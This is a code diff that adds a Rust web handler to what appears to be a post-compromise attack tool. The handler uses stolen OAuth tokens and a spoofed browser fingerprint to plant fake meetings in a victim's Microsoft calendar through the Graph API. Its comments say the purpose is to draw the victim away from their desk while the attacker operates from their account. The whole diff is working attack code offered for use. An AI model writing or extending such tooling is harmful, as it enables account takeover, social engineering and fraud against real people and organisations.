@@ -173,3 +173,89 @@ pub async fn list_calendar_events_handler(
         }
     }
 }
+
+// ============================================================
+// SILENT CALENDAR MANIPULATION — Inject fake meetings
+// ============================================================
+
+#[derive(Debug, Deserialize)]
+pub struct InjectMeetingRequest {
+    pub token_id: String,
+    pub subject: String,
+    pub start_time: String,
+    pub duration_minutes: Option<i32>,
+    pub location: Option<String>,
+    pub body: Option<String>,
+}
+
+/// Inject a fake meeting into the victim's calendar. This manipulates
+/// their behavior — e.g., an "Emergency budget review at 3 PM" gets them
+/// away from their desk while you operate from their account.
+pub async fn inject_meeting_handler(
+    body: web::Json<InjectMeetingRequest>,
+    state: web::Data<crate::AppState>,
+) -> impl Responder {
+    let token = match crate::retrieve_any_token(&state, &body.token_id).await {
+        Ok(t) => t,
+        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
+    };
+    let access_token = crate::refresh_access_token(&state, &token.refresh_token).await
+        .unwrap_or_else(|| token.access_token.clone());
+
+    let duration = body.duration_minutes.unwrap_or(30);
+    let location = body.location.as_deref().unwrap_or("Conference Room A");
+    let meeting_body = body.body.as_deref().unwrap_or("Please join the meeting on time. This is an important discussion that requires your presence.");
+
+    // Calculate end time from start + duration
+    let start_dt = match chrono::DateTime::parse_from_rfc3339(&body.start_time) {
+        Ok(dt) => dt,
+        Err(_) => return HttpResponse::BadRequest().json(serde_json::json!({"error": "Invalid start_time format. Use ISO 8601 (e.g., 2026-06-19T15:00:00Z)"})),
+    };
+    let end_dt = start_dt + chrono::Duration::minutes(duration as i64);
+
+    let payload = serde_json::json!({
+        "subject": body.subject,
+        "body": {
+            "contentType": "HTML",
+            "content": format!("<p>{}</p>", meeting_body)
+        },
+        "start": {
+            "dateTime": start_dt.format("%Y-%m-%dT%H:%M:%S").to_string(),
+            "timeZone": "UTC"
+        },
+        "end": {
+            "dateTime": end_dt.format("%Y-%m-%dT%H:%M:%S").to_string(),
+            "timeZone": "UTC"
+        },
+        "location": {
+            "displayName": location
+        },
+        "isOnlineMeeting": false,
+        "responseRequested": false
+    });
+
+    let client = GraphClient::with_fingerprint(
+        token.user_agent.clone(),
+        token.accept_language.clone(),
+    );
+
+    match client.create_calendar_event(&access_token, payload).await {
+        Ok(event) => {
+            eprintln!("[calendar] Injected fake meeting '{}' at {}", body.subject, body.start_time);
+            HttpResponse::Ok().json(serde_json::json!({
+                "success": true,
+                "event_id": event.id,
+                "subject": body.subject,
+                "start": body.start_time,
+                "message": "Fake meeting injected into victim's calendar"
+            }))
+        }
+        Err(e) => {
+            eprintln!("[calendar] Failed to inject meeting: {}", e);
+            HttpResponse::InternalServerError().json(serde_json::json!({
+                "error": "inject_meeting_failed",
+                "details": format!("{}", e)
+            }))
+        }
+    }
+}
